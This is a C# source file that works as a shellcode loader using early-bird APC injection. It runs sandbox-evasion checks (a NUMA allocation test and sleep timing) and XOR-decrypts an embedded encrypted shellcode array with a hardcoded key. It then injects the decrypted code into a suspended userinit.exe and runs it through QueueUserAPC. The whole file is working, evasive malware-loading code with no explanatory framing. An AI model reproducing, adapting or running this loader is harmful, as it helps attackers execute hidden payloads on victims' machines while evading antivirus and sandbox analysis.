using System;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace QUserAPCProcessInjection
{

　
    public class Program1
    {
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION
		{
			// A handle to the newly created process. The handle is used to specify the process in all functions that perform operations on the process object.
			public IntPtr hProcess;
			// A handle to the primary thread of the newly created process. The handle is used to specify the thread in all functions that perform operations on the thread object.
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}
		
		[Flags]
		public enum ThreadAccess : int
		{
			TERMINATE = (0x0001),
			SUSPEND_RESUME = (0x0002),
			GET_CONTEXT = (0x0008),
			SET_CONTEXT = (0x0010),
			SET_INFORMATION = (0x0020),
			QUERY_INFORMATION = (0x0040),
			SET_THREAD_TOKEN = (0x0080),
			IMPERSONATE = (0x0100),
			DIRECT_IMPERSONATION = (0x0200),
			THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
			THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
		}
		
		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		
		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool CreateProcess(
				   string lpApplicationName,
				   string lpCommandLine,
				   IntPtr lpProcessAttributes,
				   IntPtr lpThreadAttributes,
				   bool bInheritHandles,
				   ProcessCreationFlags dwCreationFlags,
				   IntPtr lpEnvironment,
				   string lpCurrentDirectory,
				   ref STARTUPINFO lpStartupInfo, 
				   out PROCESS_INFORMATION lpProcessInformation);
		

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenThread(
					ThreadAccess dwDesiredAccess, 		
					bool bInheritHandle,
					int dwThreadId);
		
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
				
		[DllImport("kernel32.dll")]
		private static extern UInt32 QueueUserAPC(
					IntPtr pfnAPC,
					IntPtr hThread,
					IntPtr dwData);
					
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentThread();

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr FlsAlloc(IntPtr callback);

		

		public static void Main(string[] args)

        {
        	//IntPtr mem0 = FlsAlloc(IntPtr.Zero);

			//if (mem0 != null)
			//{
				//Console.WriteLine("failed");
				//return;
			//}
			
            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }
			
			DateTime time1 = DateTime.Now;
            Sleep(2000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 1.5)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
				return;
            }
			
			static byte[] xor(byte[] cipher, byte[] key)
			{
			byte[] xored = new byte[cipher.Length];

			for (int i = 0; i < cipher.Length; i++)
			{
				xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
			}

			return xored;
			}
			
			string key = "TAMSIKUNOSF";
			
			System.Threading.Thread.Sleep(3000);
			// This shellcode byte is the encrypted output from encryptor.exe

			byte[] timsina = new byte[511] {0x9c, 0xac, 0x97, 0xc8, 0x15, 0x4c, 0x79, 0x52, 0xae, 0xee, 0x12, 0x49, 0x39, 0x15, 0xa6, 0xab, 0x07, 0xe7, 0x3a, 0xb8, 0xd0, 0x03, 0x8f, 0x7a, 0x05, 0x82, 0x55, 0x0e, 0xac, 0xb0, 0xb1, 0x69, 0xa2, 0x87, 0xac, 0x04, 0x94, 0xab, 0x27, 0x1e, 0x21, 0x3b, 0xef, 0x0a, 0x10, 0x04, 0x98, 0xbe, 0x64, 0x49, 0x7c, 0x44, 0xf4, 0x14, 0x11, 0x49, 0x39, 0x15, 0x00, 0x54, 0x46, 0x13, 0x4f, 0x26, 0x0c, 0x1c, 0x08, 0x0b, 0x65, 0x3c, 0x54, 0xbe, 0xd0, 0x9a, 0xb1, 0x0a, 0x83, 0x90, 0x51, 0xf7, 0x00, 0xad, 0xcf, 0x1b, 0x95, 0xc7, 0x1d, 0xbb, 0xc0, 0x1a, 0x84, 0x70, 0x19, 0x81, 0xda, 0x06, 0x8d, 0xdc, 0x03, 0x9c, 0xac, 0xa8, 0x12, 0xf0, 0x1e, 0xe9, 0x0e, 0x87, 0x64, 0x03, 0xbb, 0xda, 0x05, 0x19, 0x15, 0x46, 0x53, 0x5f, 0x4e, 0x3d, 0x12, 0x08, 0x13, 0x27, 0xb7, 0xdd, 0x18, 0x73, 0x8b, 0xcd, 0x1d, 0x1e, 0x37, 0x53, 0xb5, 0xc2, 0x81, 0xb9, 0x0c, 0x87, 0x97, 0x57, 0xf1, 0x08, 0xaa, 0xc4, 0x09, 0x0c, 0x07, 0x57, 0x25, 0x87, 0x64, 0x06, 0xab, 0xda, 0x05, 0x51, 0xb8, 0xc5, 0x1b, 0x4f, 0x4e, 0x55, 0xd8, 0xa1, 0xb6, 0x38, 0x8f, 0xab, 0x0f, 0x59, 0x3b, 0x8e, 0xd0, 0x9e, 0xb6, 0x32, 0x39, 0xe4, 0xcd, 0xfc, 0x12, 0xb6, 0xc7, 0x1d, 0xa9, 0xc0, 0x1f, 0x15, 0x00, 0x44, 0x2c, 0x94, 0xc6, 0x06, 0x80, 0xb4, 0xa9, 0x8c, 0x42, 0xab, 0xee, 0x07, 0x92, 0xc6, 0x06, 0x95, 0xb4, 0x01, 0x91, 0xc4, 0x09, 0x94, 0xb9, 0x1b, 0x8f, 0x7f, 0x18, 0x82, 0x78, 0x1e, 0x1d, 0x11, 0x0a, 0x07, 0x59, 0x25, 0x9b, 0xaa, 0x4b, 0x22, 0xd3, 0x64, 0xfb, 0x15, 0x1f, 0x53, 0x4f, 0x4f, 0x54, 0x23, 0xa3, 0xda, 0x01, 0x94, 0xab, 0x41, 0x75, 0x38, 0x02, 0xef, 0x0a, 0xb8, 0xda, 0x01, 0xa5, 0xdd, 0x0f, 0x07, 0x0e, 0x06, 0x5f, 0xe3, 0x89, 0xc3, 0x52, 0x41, 0x56, 0xfa, 0x1a, 0xaa, 0xc7, 0x1c, 0x4b, 0x49, 0x52, 0xed, 0xad, 0xd5, 0x0e, 0xb5, 0xc6, 0x07, 0x03, 0x0a, 0x49, 0x53, 0x7f, 0x72, 0x0b, 0x74, 0x20, 0x38, 0xf0, 0x1c, 0x16, 0xb6, 0xac, 0xb2, 0x0a, 0xbd, 0x54, 0xd8, 0x07, 0x14, 0x0c, 0x0a, 0x11, 0xb3, 0xb2, 0x13, 0x15, 0x66, 0xbf, 0xcc, 0x06, 0x0f, 0x0a, 0x10, 0x12, 0x15, 0x00, 0x0e, 0x1f, 0x0d, 0x9f, 0x4f, 0x1d, 0x13, 0x08, 0x0b, 0x0c, 0xc9, 0x50, 0xcd, 0x12, 0x9f, 0x4f, 0x1c, 0x57, 0x09, 0xd8, 0x09, 0x09, 0x58, 0xcd, 0x12, 0x29, 0x9e, 0x54, 0x02, 0x6d, 0x13, 0xc6, 0x05, 0x0c, 0x9e, 0x26, 0x9e, 0x77, 0x10, 0x43, 0x6d, 0x1f, 0x4e, 0x0d, 0xa5, 0x33, 0xb3, 0x77, 0x8f, 0x54, 0x0a, 0x44, 0x9a, 0x8c, 0x00, 0xf8, 0x86, 0x62, 0x07, 0x98, 0x54, 0x03, 0x80, 0x62, 0x00, 0xc9, 0x60, 0xcd, 0x12, 0x86, 0xb1, 0x1d, 0x1d, 0xaa, 0x83, 0x4c, 0x08, 0x04, 0x5e, 0x1b, 0xc4, 0x6e, 0x15, 0xc0, 0x0d, 0x83, 0x4c, 0x09, 0x33, 0x32, 0x93, 0xca, 0x06, 0x55, 0x4b, 0x49, 0xdb, 0xcd, 0xca, 0x54, 0x46, 0x53, 0x3d, 0xcb, 0x5a, 0x49, 0x42, 0x4b, 0x35, 0xc0, 0x32, 0x96, 0x52, 0x07, 0x72, 0x17, 0xc0, 0x18, 0x12, 0x6d, 0x13, 0xdf, 0x0e, 0x01, 0xa2, 0xac, 0x94, 0x4a, 0x08, 0x5e, 0x84, 0x80, 0x15, 0x66, 0x7f, 0x4d, 0x32, 0x34, 0x77, 0xe5, 0x93, 0x7c, 0x09, 0x9d, 0x77, 0x1e, 0x1f, 0x3c, 0xde, 0x03, 0x03, 0x19, 0xfa, 0x4e, 0x1c, 0x66, 0x01, 0xc4, 0x06, 0x4d, 0x19, 0xc2, 0x1b, 0x2d, 0x13, 0xdf, 0x0e, 0x36, 0x19, 0x9c, 0x64, 0x03, 0x18, 0x01, 0x1d, 0x00, 0x05, 0x07, 0x53, 0x4f, 0x4e, 0x99, 0xa3, 0xb9, 0xb7, 0xce, 0x09, 0xa8};


			Array.Reverse(timsina);

			byte[] royan;
			royan = xor(timsina, Encoding.ASCII.GetBytes(key));
            
			var prajwal = royan;
			
			System.Threading.Thread.Sleep(3000);

			string binary = "userinit.exe";
			
            string processPath = "C:\\Windows\\System32\\" + binary;
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
			
			CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
			
			
			IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)prajwal.Length, 0x1000 | 0x2000, 0x40);
			
			
			WriteProcessMemory(pi.hProcess, alloc, prajwal, (uint)prajwal.Length, out UIntPtr bytesWritten);
			

			IntPtr tpointer = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
		
			
			VirtualProtectEx(pi.hProcess, alloc, prajwal.Length, 0x20, out oldProtect);
			
			
			QueueUserAPC(alloc, tpointer, IntPtr.Zero);
			

            ResumeThread(pi.hThread);
			
			System.Threading.Thread.Sleep(3000);
		}
	}
}